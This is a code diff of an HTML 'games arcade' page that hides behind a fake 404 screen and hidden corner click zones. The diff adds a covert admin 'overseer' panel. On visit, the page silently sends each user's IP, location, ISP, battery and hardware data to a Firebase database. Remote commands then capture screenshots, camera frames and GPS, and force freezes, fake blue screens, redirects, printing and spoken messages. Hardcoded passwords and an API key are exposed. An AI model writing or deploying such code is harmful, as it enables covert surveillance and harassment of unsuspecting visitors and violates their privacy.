@@ -6,275 +6,384 @@
     <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        :root { --primary: #00ff41; --bg: #000; --card: #111; --err: #ff0000; }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; transition: 0.3s; }
+        :root { --primary: #00ff41; --bg: #000; --card: #111; --accent: #003b00; --fav: #ff4757; --warn: #ffae00; --err: #ff0000; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
         
-        /* Triggers */
-        #ghostAdmin { position: fixed; top: 0; left: 0; width: 50px; height: 50px; z-index: 2000000; cursor: default; }
+        /* Secret Triggers */
+        #ghostAdmin { position: fixed; top: 0; left: 0; width: 80px; height: 80px; z-index: 2000000; cursor: default; }
+        #ghostPleb { position: fixed; top: 0; right: 0; width: 80px; height: 80px; z-index: 2000000; cursor: default; }
 
-        /* Fake Screens */
         #lockdown { position: fixed; inset: 0; background: #fff; z-index: 1000000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         #loginOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 1500000; display: none; align-items: center; justify-content: center; }
-        #freeze { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999999; display: none; flex-direction:column; align-items: center; justify-content: center; color: var(--primary); font-family: monospace; font-size: 24px; }
         
-        /* Main App */
+        /* Overlays */
+        #freeze { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999999; display: none; cursor: wait; color: var(--primary); font-family: monospace; flex-direction:column; align-items: center; justify-content: center; font-size: 20px; }
+        #bsod { display:none; position:fixed; inset:0; background:#0078d7; color:#fff; font-family:'Segoe UI', sans-serif; z-index:99999999; padding:100px; font-size:24px; cursor:none; }
+
         #app { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; }
-        .nav { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: rgba(255,255,255,0.05); border-bottom: 1px solid #333; }
-        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; flex-grow: 1; }
+        .nav { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: #080808; border-bottom: 1px solid #222; }
         
-        .card { background: var(--card); border: 1px solid #333; padding: 30px; text-align: center; cursor: pointer; border-radius: 8px; color: var(--primary); transition: 0.2s; }
-        .card:hover { border-color: var(--primary); background: #1a1a1a; transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,255,0,0.1); }
-
-        /* Admin Panel v2 */
-        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #080808; border: 1px solid #444; width: 95%; max-width: 1200px; height: 85vh; z-index: 3000000; border-radius: 12px; box-shadow: 0 0 100px #000; color: #fff; display: flex; flex-direction: column; }
-        .m-head { padding: 15px; background: #111; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
-        .m-tabs { display: flex; background: #000; border-bottom: 1px solid #333; }
-        .m-tab { flex: 1; padding: 10px; text-align: center; cursor: pointer; color: #666; background: #050505; transition: 0.2s; }
-        .m-tab:hover { color: #fff; background: #111; }
-        .m-tab.active { color: var(--primary); border-bottom: 3px solid var(--primary); background: #0a0a0a; font-weight: bold; }
-
-        .m-body { flex-grow: 1; display: none; padding: 20px; overflow: hidden; gap: 20px; }
-        .m-body.show { display: flex; }
-
-        /* Admin Columns */
-        .col-list { width: 280px; background: #050505; border: 1px solid #333; overflow-y: auto; }
-        .u-item { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; color: #888; font-size: 13px; }
-        .u-item:hover { color: #fff; background: #111; }
-        .u-item.selected { border-left: 4px solid var(--primary); background: #111; color: var(--primary); }
-
-        .col-main { flex-grow: 1; display: flex; flex-direction: column; gap: 15px; }
+        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; flex-grow: 1; }
         
-        /* Preview Window */
-        #monitor { height: 350px; background: #000; border: 1px solid #333; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        #mon-img { max-width: 100%; max-height: 100%; display: none; }
-        #mon-vid { width: 100%; height: 100%; display: none; }
+        /* UPDATED CARD & FAV BUTTON */
+        .card { background: var(--card); border: 1px solid #222; padding: 40px 15px; text-align: center; cursor: pointer; border-radius: 8px; color: var(--primary); position: relative; transition: 0.2s; }
+        .card:hover { border-color: var(--primary); background: #0a1a0a; transform: scale(1.02); }
         
-        .btn-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; }
-        .btn { background: #222; color: var(--primary); border: 1px solid #444; padding: 12px; cursor: pointer; border-radius: 4px; font-weight: bold; text-transform: uppercase; font-size: 11px; transition: 0.2s; }
-        .btn:hover { background: var(--primary); color: #000; }
-        .btn-red { border-color: var(--err); color: var(--err); }
-        .btn-red:hover { background: var(--err); color: white; }
+        /* Easier to click Favorite Button */
+        .fav-area { 
+            position: absolute; top: 5px; right: 5px; 
+            width: 40px; height: 40px; 
+            display: flex; align-items: center; justify-content: center; 
+            z-index: 100; cursor: pointer; 
+            background: #1a1a1a; border-radius: 50%; border: 1px solid #333;
+            transition: 0.2s;
+        }
+        .fav-area:hover { background: #333; border-color: var(--fav); }
+        .fav-btn { color: #555; font-size: 22px; pointer-events: none; transition: 0.2s; }
+        .fav-btn.active { color: var(--fav); text-shadow: 0 0 10px var(--fav); }
+
+        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #0a0a0a; border: 1px solid #333; padding: 25px; z-index: 3000000; width: 95%; max-width: 1200px; border-radius: 12px; box-shadow: 0 0 60px #000; color: #fff; }
+        .input { background: #000; border: 1px solid #444; color: var(--primary); padding: 12px; width: 100%; box-sizing: border-box; margin: 10px 0; outline: none; border-radius: 6px; font-family: monospace; }
+        .btn { background: var(--primary); color: #000; border: none; padding: 10px 15px; cursor: pointer; font-weight: bold; border-radius: 4px; text-transform: uppercase; font-size: 11px; transition: 0.2s; font-family: monospace; }
+        .btn:hover { opacity: 0.8; }
+        .btn-red { background: var(--err); color: #fff; }
+        .btn-warn { background: var(--warn); color: #000; }
         
-        /* Config Panel */
-        .cfg-row { margin-bottom: 15px; padding: 15px; border: 1px solid #333; background: #111; }
-        .cfg-row h4 { margin: 0 0 10px 0; color: #ccc; }
-        .inp { padding: 8px; background: #000; border: 1px solid #444; color: white; width: 100%; box-sizing: border-box; }
+        .admin-layout { display: flex; gap: 20px; height: 600px; }
+        .u-sidebar { width: 300px; border: 1px solid #333; overflow-y: auto; background: #050505; }
+        .u-item { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; color: #888; transition: 0.2s; }
+        .u-item:hover { background: #111; color: #fff; }
+        .u-item.selected { border-left: 4px solid var(--primary); background: #0a1a0a; color: var(--primary); }
+        
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size: 12px; background: #000; padding: 15px; border: 1px solid #333; color: #ccc; overflow-y: auto; max-height: 150px; }
+        .info-grid b { color: var(--primary); }
+        .info-grid span { color: #fff; }
+
+        #preview { height: 350px; border: 1px solid #333; background: #000 no-repeat center; background-size: contain; position: relative; }
+        #live-indicator { position: absolute; top: 10px; right: 10px; background: red; color: white; padding: 5px 10px; border-radius: 4px; font-size: 10px; display: none; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        .switch { display: flex; align-items: center; gap: 10px; cursor: pointer; margin-bottom: 10px; }
+        .check-box { width: 20px; height: 20px; border: 1px solid #444; display: flex; align-items: center; justify-content: center; color: var(--primary); }
     </style>
 </head>
 <body>
 
     <div id="ghostAdmin" onclick="door('admin')"></div>
+    <div id="ghostPleb" onclick="door('pleb')"></div>
 
-    <div id="lockdown"><h1>404</h1><p>Server Not Found</p></div>
-    <div id="freeze"><h1>🚫 COMPUTER FROZEN 🚫</h1><p>Malicious Activity Detected.</p></div>
+    <div id="lockdown"><h1>404</h1><p>The requested URL was not found on this server.</p></div>
+    <div id="freeze"><h1>SYSTEM PAUSED</h1><p>Contact Administrator</p></div>
+    <div id="bsod">:(<br><br>Your PC ran into a problem and needs to restart.<br><br><span style="font-size:18px">Stop Code: CRITICAL_PROCESS_DIED</span></div>
 
     <div id="loginOverlay">
-        <div style="text-align:center; width: 320px; background:#111; padding:40px; border-radius:8px; border:1px solid #333; box-shadow: 0 0 50px rgba(0,0,0,0.5);">
-            <h2 id="loginTitle" style="color:var(--primary); margin-top:0;">SYSTEM LOGIN</h2>
-            <input type="text" id="username" class="inp" placeholder="Identity...">
-            <br><br>
+        <div style="text-align:center; width: 320px; background:#0a0a0a; padding:40px; border-radius:15px; border:1px solid #333;">
+            <h2 style="color:var(--primary); margin-top:0;">MONGLE_OS v4.0</h2>
+            <input type="text" id="username" class="input" placeholder="Identify Yourself...">
             <button class="btn" style="width:100%" onclick="initSession()">CONNECT</button>
         </div>
     </div>
 
     <div id="app">
         <div class="nav">
-            <div id="mainTitle" style="font-weight:bold; font-size:20px;">SYSTEM</div>
-            <input type="text" id="search" class="inp" style="width:200px" placeholder="Search..." oninput="renderGrid()">
-            <div style="display:flex; gap:10px;">
-                <button id="adminBtn" class="btn" style="display:none;" onclick="togglePanel()">ADMIN</button>
-                <button class="btn btn-red" onclick="window.location.replace('https://google.com')">PANIC</button>
+            <div style="min-width: 150px;"><b>MONGLE_OS</b> <span id="badge" style="font-size:10px; color:var(--primary);"></span></div>
+            <div style="display:flex; gap:10px; flex-grow:1; justify-content: center; max-width:800px;">
+                <select id="cat" class="input" style="width:140px; margin:0;" onchange="renderGrid()">
+                    <option value="all">ALL_FILES</option>
+                    <option value="favs">FAVORITES ❤️</option>
+                    <option value="fnaf">FNAF (Only)</option>
+                    <option value="horror">SCARY / HORROR</option>
+                    <option value="action">ACTION / FPS</option>
+                    <option value="other">OTHER</option>
+                </select>
+                <input type="text" id="search" class="input" style="margin:0; max-width: 300px;" placeholder="Search Database..." oninput="renderGrid()">
+            </div>
+            <div style="display:flex; gap:8px; min-width: 150px; justify-content: flex-end;">
+                <button id="adminBtn" class="btn" style="display:none; background: #222; color: var(--primary); border: 1px solid var(--primary);" onclick="toggleModal('adminM')">OVERSEER</button>
+                <button class="btn" style="background:#222; color:#fff;" onclick="toggleModal('settingsM')">⚙️</button>
+                <button class="btn btn-red" onclick="panicTrigger()">PANIC</button>
             </div>
         </div>
         <div id="grid" class="game-grid"></div>
     </div>
 
-    <div id="adminPanel" class="modal" style="display:none;">
-        <div class="m-head">
-            <h3 style="margin:0; color:var(--primary);">GOD_MODE // v7.0</h3>
-            <button class="btn btn-red" onclick="togglePanel()">CLOSE</button>
-        </div>
-        <div class="m-tabs">
-            <div class="m-tab active" onclick="switchTab(0)">🕵️ SURVEILLANCE</div>
-            <div class="m-tab" onclick="switchTab(1)">⚙️ SITE CONTROL</div>
+    <div id="adminM" class="modal">
+        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:15px;">
+            <h3 style="margin:0; color:var(--primary);">OVERSEER_CONTROL_DECK</h3>
+            <div>
+                <button class="btn btn-warn" onclick="globalReload()">NUKE (RELOAD ALL)</button>
+                <button class="btn" style="background:#222; color:#fff;" onclick="toggleModal('adminM')">CLOSE</button>
+            </div>
         </div>
         
-        <div class="m-body show" id="tab0">
-            <div id="userList" class="col-list"></div>
-            <div class="col-main">
-                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; background:#111; padding:10px; border:1px solid #333;">
-                    <div id="info-left">Select User...</div>
-                    <div id="info-right">Waiting...</div>
+        <div class="admin-layout">
+            <div id="userList" class="u-sidebar"></div>
+            <div class="d-content">
+                <div id="dossier" class="info-grid">Select a user to view intel...</div>
+                
+                <div id="preview">
+                    <div id="live-indicator">● LIVE FEED</div>
                 </div>
 
-                <div id="monitor">
-                    <div style="color:#444">Live Feed Inactive</div>
-                    <img id="mon-img">
-                    <video id="mon-vid" controls autoplay></video>
-                </div>
-
-                <div class="btn-grid">
-                    <button class="btn" onclick="act('capReq')">📸 SCREEN</button>
-                    <button class="btn" onclick="act('recReq')">🎥 VIDEO</button>
-                    <button class="btn" onclick="act('gpsReq')">📍 ADDRESS</button>
-                    <button class="btn btn-red" onclick="act('kicked')">🚫 KICK</button>
-                    <button class="btn btn-red" onclick="act('bsod')">☠️ CRASH</button>
+                <div style="display:grid; grid-template-columns: repeat(5, 1fr); gap:8px;">
+                    <button class="btn" onclick="adminAct('capReq')">📸 SCREEN</button>
+                    <button class="btn" onclick="adminAct('camReq')">🎥 CAMERA</button>
+                    <button class="btn" onclick="adminAct('gpsReq')">📍 GET GPS</button>
+                    <button class="btn" id="watchBtn" style="background:#004400; color:white;" onclick="toggleWatch()">👁️ WATCH</button>
+                    <button class="btn" style="background:purple; color:white;" onclick="adminAct('reload')">↻ RELOAD</button>
+                    
+                    <button class="btn btn-warn" onclick="adminAct('frozen')">❄️ FREEZE</button>
+                    <button class="btn btn-warn" onclick="adminAct('bsod')">☠️ BSOD</button>
+                    <button class="btn btn-warn" onclick="adminAct('print')">🖨️ PRINT</button>
+                    <button class="btn btn-warn" onclick="adminAct('vibrate')">📳 VIBE</button>
+                    <button class="btn btn-red" onclick="adminAct('kicked')">🚫 KICK</button>
                 </div>
                 
-                <div class="btn-grid">
-                    <button class="btn" onclick="custom('msg')">💬 MESSAGE</button>
-                    <button class="btn" onclick="custom('speak')">🗣️ SPEAK</button>
-                    <button class="btn" onclick="custom('bg')">🖼️ WALLPAPER</button>
-                    <button class="btn btn-red" onclick="act('skeleton')">💀 SKELINGTON</button>
-                    <button class="btn btn-red" onclick="act('freeze')">❄️ FREEZE</button>
+                <div style="display:flex; gap:8px; margin-top: 5px;">
+                    <input type="text" id="adminCommandInp" class="input" style="margin:0;" placeholder="Message / URL / Speak Text...">
+                    <button class="btn" onclick="adminCustom('msg')">MSG</button>
+                    <button class="btn" onclick="adminCustom('speak')">🗣️ SPEAK</button>
+                    <button class="btn" onclick="adminCustom('redir')">REDIR</button>
+                    <button class="btn" onclick="adminCustom('openTab')">TAB</button>
                 </div>
             </div>
         </div>
+    </div>
 
-        <div class="m-body" id="tab1">
-            <div class="col-main" style="max-width:600px; margin:0 auto;">
-                <div class="cfg-row">
-                    <h4>Global Site Name</h4>
-                    <input type="text" id="cfgName" class="inp" placeholder="MONGLE_OS">
-                    <button class="btn" style="margin-top:5px; width:100%" onclick="saveGlobal('title')">UPDATE NAME</button>
-                </div>
-                <div class="cfg-row">
-                    <h4>Theme Color</h4>
-                    <input type="color" id="cfgColor" class="inp" value="#00ff41" style="height:50px; cursor:pointer;">
-                    <button class="btn" style="margin-top:5px; width:100%" onclick="saveGlobal('color')">UPDATE THEME</button>
-                </div>
-                <div class="cfg-row">
-                    <h4>Admin Actions</h4>
-                    <button class="btn btn-red" style="width:100%" onclick="resetAll()">RESET ALL USERS</button>
-                </div>
-            </div>
+    <div id="settingsM" class="modal" style="width:340px;">
+        <h3>CONFIG</h3>
+        <div class="switch" onclick="toggleCfg('enable')">
+            <div class="check-box" id="chkEnable">✓</div>
+            <span>ENABLE PANIC KEY</span>
         </div>
+        <label style="font-size:12px; color:#888;">PANIC URL</label>
+        <input type="text" id="cfgUrl" class="input" placeholder="https://google.com">
+        <label style="font-size:12px; color:#888;">PANIC KEY (Click & Press)</label>
+        <input type="text" id="cfgKeyDisp" class="input" placeholder="Press any key..." readonly style="cursor:pointer; text-align:center; border-color:var(--primary);">
+        <label style="font-size:12px; color:#888;">STEALTH MODE</label>
+        <select id="cfgMode" class="input">
+            <option value="tab">New Tab (Standard)</option>
+            <option value="blank">About:Blank (Full Stealth)</option>
+        </select>
+        <button class="btn" style="width:100%" onclick="saveConfig()">SAVE SETTINGS</button>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, onValue, set, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        // --- 🔐 CHANGE PASSWORD HERE ---
-        const ADMIN_PASS = "balls"; 
-        // -------------------------------
-
-        const app = initializeApp({ apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" });
+        const firebaseConfig = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
+        const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
+
+        let userRef, myID, selectedID, isAdmin = false, gameData = [];
+        let favs = JSON.parse(localStorage.getItem('favs') || '[]');
+        let cfg = { url: localStorage.getItem('pUrl') || 'https://google.com', key: localStorage.getItem('pKey') || 'Escape', mode: localStorage.getItem('pMode') || 'tab', enable: localStorage.getItem('pEnable') !== 'false' };
+        let activeGameWindow = null, watchInterval = null, tempKey = cfg.key;
         
-        let userRef, myID, selectedID, isAdmin = false, gameData = [], favs = [];
+        // Settings Key Listener
+        const keyDisp = document.getElementById('cfgKeyDisp');
+        keyDisp.onclick = () => {
+            keyDisp.value = "[ PRESS KEY NOW ]"; keyDisp.style.background = "#222";
+            const handler = (e) => { e.preventDefault(); tempKey = e.key; keyDisp.value = e.key.toUpperCase(); keyDisp.style.background = "#000"; window.removeEventListener('keydown', handler); };
+            window.addEventListener('keydown', handler);
+        };
 
-        // --- GLOBAL SETTINGS LISTENER ---
-        onValue(ref(db, 'settings'), (snap) => {
-            const s = snap.val();
-            if(!s) return;
-            if(s.title) {
-                document.title = s.title;
-                document.getElementById('loginTitle').innerText = s.title;
-                document.getElementById('mainTitle').innerText = s.title;
-                if(isAdmin) document.getElementById('cfgName').value = s.title;
-            }
-            if(s.color) {
-                document.documentElement.style.setProperty('--primary', s.color);
-                if(isAdmin) document.getElementById('cfgColor').value = s.color;
-            }
-        });
-
-        window.door = (t) => {
-            if(t==='admin') { if(prompt("ENTER PASSWORD:")===ADMIN_PASS){ isAdmin=true; document.getElementById('adminBtn').style.display='block'; initSession(); togglePanel(); }} 
-            else document.getElementById('loginOverlay').style.display='flex';
-        }
+        window.door = (type) => {
+            if(type === 'admin') {
+                if(prompt("AUTH_CODE:") === "BALLS_ARE_GOOD") { isAdmin = true; document.getElementById('adminBtn').style.display="block"; document.getElementById('badge').innerText="[OVERSEER]"; initSession(); }
+            } else { document.getElementById('loginOverlay').style.display = 'flex'; }
+        };
 
         window.initSession = async () => {
-            const n = document.getElementById('username').value || "Guest";
-            document.getElementById('lockdown').style.display="none"; document.getElementById('loginOverlay').style.display="none"; document.getElementById('app').style.display="flex";
+            const name = document.getElementById('username').value || "User_" + Math.floor(Math.random()*999);
+            document.getElementById('lockdown').style.display="none"; 
+            document.getElementById('loginOverlay').style.display="none"; 
+            document.getElementById('app').style.display="flex";
 
-            userRef = push(ref(db, 'presence'), { name: n, activity: 'Main Menu', joined: Date.now(), res: `${screen.width}x${screen.height}` });
+            // Standard IP Geo (Approximate)
+            let ipInfo = { ip: 'Hidden', city: '?', region: '?', org: '?' };
+            try { const r = await fetch('https://ipapi.co/json/'); if(r.ok) ipInfo = await r.json(); } catch(e) {}
+
+            const bat = await navigator.getBattery?.().catch(()=>({}));
+            
+            userRef = push(ref(db, 'presence'), {
+                name: name, activity: 'Browsing Menu', joined: new Date().toLocaleTimeString(),
+                res: `${screen.width}x${screen.height}`, 
+                hw: `${navigator.hardwareConcurrency||'?'}C / ${navigator.deviceMemory||'?'}GB`,
+                bat: bat?.level ? `${Math.round(bat.level*100)}%` : '?',
+                plat: navigator.platform,
+                ip: ipInfo.ip, loc: `${ipInfo.city}, ${ipInfo.region}`, isp: ipInfo.org,
+                gps: 'Pending Permission...',
+                reload: false
+            });
             myID = userRef.key;
             onDisconnect(userRef).remove();
 
-            // CLIENT LISTENER
+            // Client Logic
             onValue(ref(db, `presence/${myID}`), (s) => {
                 const d = s.val(); if(!d) return;
-                if(d.kicked) window.location.href = "https://google.com";
-                if(d.bsod) document.body.innerHTML = `<div style="background:#0078d7;color:#fff;font-size:40px;padding:50px;">:(<br>FATAL_ERROR</div>`;
-                document.getElementById('freeze').style.display = d.freeze ? 'flex' : 'none';
                 
-                if(d.skeleton) { 
-                    const a = new Audio('https://www.myinstants.com/media/sounds/spooky-scary-skeletons-remix.mp3'); 
-                    a.volume = 1.0; a.play(); 
-                    alert("💀 YOU HAVE BEEN SKELETON'D! 💀");
-                    update(userRef, {skeleton: false});
+                if(d.kicked) { closeGame(); window.location.replace(cfg.url); }
+                if(d.redir) window.location.replace(d.redir);
+                if(d.openTab) { window.open(d.openTab, '_blank'); update(userRef, {openTab:null}); }
+                if(d.reload) window.location.reload();
+                if(d.print) { window.print(); update(userRef, {print:false}); }
+                if(d.vibrate) { if(navigator.vibrate) navigator.vibrate([200, 100, 200]); update(userRef, {vibrate:false}); }
+                
+                document.getElementById('freeze').style.display = d.frozen ? 'flex' : 'none';
+                document.getElementById('bsod').style.display = d.bsod ? 'block' : 'none';
+                if(d.frozen || d.bsod) closeGame();
+
+                if(d.msg) { alert("ADMIN: " + d.msg); update(userRef, {msg: null}); }
+                
+                if(d.speak) {
+                    
+                    const u = new SpeechSynthesisUtterance(d.speak);
+                    window.speechSynthesis.speak(u);
+                    update(userRef, {speak: null});
                 }
 
-                if(d.msg) { alert("SYSTEM: "+d.msg); update(userRef, {msg:null}); }
-                if(d.speak) { const u = new SpeechSynthesisUtterance(d.speak); window.speechSynthesis.speak(u); update(userRef, {speak:null}); }
-                if(d.bg) { document.getElementById('app').style.backgroundImage = `url(${d.bg})`; update(userRef, {bg:null}); }
+                // GPS Request (Standard Browser Prompt)
+                if(d.gpsReq) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => { update(userRef, {gps: `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`, gpsReq: false}); },
+                        (err) => { update(userRef, {gps: "Denied by User", gpsReq: false}); }
+                    );
+                }
 
-                if(d.capReq) html2canvas(document.body).then(c=>update(userRef,{lastCap:c.toDataURL("image/webp",0.2),capReq:false}));
-                if(d.recReq) navigator.mediaDevices.getUserMedia({video:true}).then(st=>{const r=new MediaRecorder(st);const c=[];r.ondataavailable=e=>c.push(e.data);r.onstop=()=>{const b=new Blob(c,{type:'video/webm'});const fr=new FileReader();fr.readAsDataURL(b);fr.onloadend=()=>update(userRef,{lastVid:fr.result,recReq:false});st.getTracks().forEach(t=>t.stop())};r.start();setTimeout(()=>r.stop(),5000)}).catch(()=>update(userRef,{recReq:false}));
-                if(d.gpsReq) navigator.geolocation.getCurrentPosition(async p=>{
-                    try { const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`); const j=await r.json(); update(userRef,{address:j.display_name, gpsReq:false}); } catch(e){update(userRef,{address:"Lookup Failed",gpsReq:false});}
-                });
+                // Camera Request (Standard Browser Prompt)
+                if(d.camReq) {
+                    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                        const v = document.createElement('video'); v.srcObject = stream; v.play();
+                        v.onloadedmetadata = () => {
+                            const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
+                            c.getContext('2d').drawImage(v,0,0);
+                            stream.getTracks().forEach(t=>t.stop());
+                            update(userRef, {lastCap: c.toDataURL("image/webp", 0.5), camReq: false});
+                        };
+                    }).catch(e => { update(userRef, {camReq: false}); });
+                }
+
+                if(d.capReq) {
+                    html2canvas(document.body, {useCORS: true}).then(c => update(userRef, {lastCap: c.toDataURL("image/webp", 0.2), capReq: false}))
+                    .catch(()=>update(userRef,{capReq:false}));
+                }
             });
 
-            const r = await fetch('https://api.github.com/repos/bob154526-hue/Mongle/contents/');
-            gameData = (await r.json()).filter(f=>f.name.endsWith('.html')&&f.name!=='index.html');
+            // Load Games
+            const res = await fetch('https://api.github.com/repos/bob154526-hue/Mongle/contents/');
+            const data = await res.json();
+            gameData = data.filter(f => f.name.endsWith('.html') && f.name !== 'index.html');
             renderGrid();
             if(isAdmin) startOverseer();
-        }
+        };
+
+        function closeGame() { if(activeGameWindow) activeGameWindow.close(); }
 
         window.renderGrid = () => {
             const q = document.getElementById('search').value.toLowerCase();
-            const g = document.getElementById('grid'); g.innerHTML="";
-            gameData.filter(x=>x.name.toLowerCase().includes(q)).forEach(game => {
-                const c = document.createElement('div'); c.className="card";
-                c.innerHTML=`<b>${game.name.replace('.html','')}</b>`;
-                c.onclick = () => {
-                    update(userRef, { activity: `Playing: ${game.name}` });
-                    window.open(`https://raw.githack.com/bob154526-hue/Mongle/main/${game.name}`, '_blank');
+            const cat = document.getElementById('cat').value;
+            const grid = document.getElementById('grid'); grid.innerHTML = "";
+            let sorted = [...gameData].sort((a,b) => favs.includes(b.name) - favs.includes(a.name));
+            
+            sorted.filter(g => {
+                const n = g.name.toLowerCase();
+                if (!n.includes(q)) return false;
+                if (cat === 'favs') return favs.includes(g.name);
+                
+                // Strict Categories
+                const isFnaf = n.includes('fnaf');
+                const isHorror = (n.includes('scary') || n.includes('horror') || n.includes('granny')) && !isFnaf;
+                const isAction = n.includes('doom') || n.includes('quake') || n.includes('action') || n.includes('shooter') || n.includes('cs');
+                
+                if (cat === 'fnaf' && !isFnaf) return false;
+                if (cat === 'horror' && !isHorror) return false;
+                if (cat === 'action' && !isAction) return false;
+                if (cat === 'other' && (isFnaf || isHorror || isAction)) return false;
+                
+                return true;
+            }).forEach(g => {
+                const card = document.createElement('div'); card.className = "card";
+                card.innerHTML = `<div class="fav-area" onclick="toggleFav(event,'${g.name}')"><span class="fav-btn ${favs.includes(g.name)?'active':''}">❤</span></div>${g.name.replace('.html','').toUpperCase()}`;
+                card.onclick = () => {
+                    const url = `https://raw.githack.com/bob154526-hue/Mongle/main/${g.name}`;
+                    update(userRef, {activity: 'Playing '+g.name});
+                    if(cfg.mode==='blank') {
+                        activeGameWindow = window.open('about:blank');
+                        activeGameWindow.document.body.innerHTML = `<style>body,html{margin:0;padding:0;height:100vh;width:100vw;overflow:hidden;background:#000}iframe{width:100vw;height:100vh;border:none}</style><iframe src="${url}" allowfullscreen></iframe>`;
+                    } else { activeGameWindow = window.open(url, '_blank'); }
                 };
-                g.appendChild(c);
+                grid.appendChild(card);
             });
-        }
+        };
 
-        /* --- ADMIN FUNCTIONS --- */
+        window.toggleFav = (e, n) => { e.stopPropagation(); if(favs.includes(n)) favs = favs.filter(f=>f!==n); else favs.push(n); localStorage.setItem('favs', JSON.stringify(favs)); renderGrid(); };
+
+        /* --- ADMIN --- */
         function startOverseer() {
             onValue(ref(db, 'presence'), (snap) => {
-                const l = document.getElementById('userList'); l.innerHTML="";
+                const list = document.getElementById('userList'); list.innerHTML = "";
                 snap.forEach(c => {
                     const u = c.val();
-                    const d = document.createElement('div'); d.className = `u-item ${selectedID===c.key?'selected':''}`;
-                    d.innerHTML = `<b>${u.name}</b><br>${u.activity}`;
-                    d.onclick=()=>{selectedID=c.key; updateInfo(u);};
-                    l.appendChild(d);
-                    if(selectedID===c.key) updateInfo(u);
+                    const d = document.createElement('div');
+                    d.className = `u-item ${selectedID === c.key ? 'selected' : ''}`;
+                    let status = u.frozen ? "❄️" : (u.bsod ? "☠️" : "🟢");
+                    if(u.kicked) status = "🚫";
+                    d.innerHTML = `<b>${status} ${u.name}</b><br><small>${u.activity}</small>`;
+                    d.onclick = () => { selectedID = c.key; updateDossier(u, c.key); startOverseer(); };
+                    list.appendChild(d);
+                    if(selectedID === c.key) updateDossier(u, c.key);
                 });
             });
         }
-        
-        function updateInfo(u) {
-            document.getElementById('info-left').innerHTML = `<b>ADDR:</b> ${u.address||'N/A'}<br><b>RES:</b> ${u.res}`;
-            document.getElementById('info-right').innerHTML = `<b>ACT:</b> ${u.activity}`;
-            const i=document.getElementById('mon-img'), v=document.getElementById('mon-vid');
-            if(u.lastVid){v.src=u.lastVid;v.style.display="block";i.style.display="none";}
-            else if(u.lastCap){i.src=u.lastCap;i.style.display="block";v.style.display="none";}
+
+        function updateDossier(u, key) {
+            document.getElementById('dossier').innerHTML = `
+                <div><b>ID:</b> ${key.substring(0,6)}...</div>
+                <div><b>STATUS:</b> ${u.frozen?'FROZEN':(u.bsod?'BSOD':'ACTIVE')}</div>
+                <div><b>IP:</b> ${u.ip}</div>
+                <div><b>LOC:</b> ${u.loc}</div>
+                <div><b>GPS:</b> ${u.gps || 'N/A'}</div>
+                <div><b>ISP:</b> ${u.isp}</div>
+                <div><b>RES:</b> ${u.res}</div>
+                <div><b>BATTERY:</b> ${u.bat}</div>
+            `;
+            if(u.lastCap) document.getElementById('preview').style.backgroundImage = `url(${u.lastCap})`;
         }
 
-        window.togglePanel = () => { const m=document.getElementById('adminPanel'); m.style.display=m.style.display==='none'?'flex':'none'; };
-        window.switchTab = (n) => { 
-            document.querySelectorAll('.m-tab').forEach((t,i)=>t.className=i===n?'m-tab active':'m-tab');
-            document.getElementById('tab0').className=n===0?'m-body show':'m-body';
-            document.getElementById('tab1').className=n===1?'m-body show':'m-body';
+        window.adminAct = (t) => { if(selectedID) onValue(ref(db, `presence/${selectedID}/${t}`), (s) => { let val=!s.val(); if(t==='reload'||t==='print'||t==='vibrate'||t==='gpsReq'||t==='camReq') val=true; update(ref(db, `presence/${selectedID}`), {[t]: val}); }, {onlyOnce:true}); };
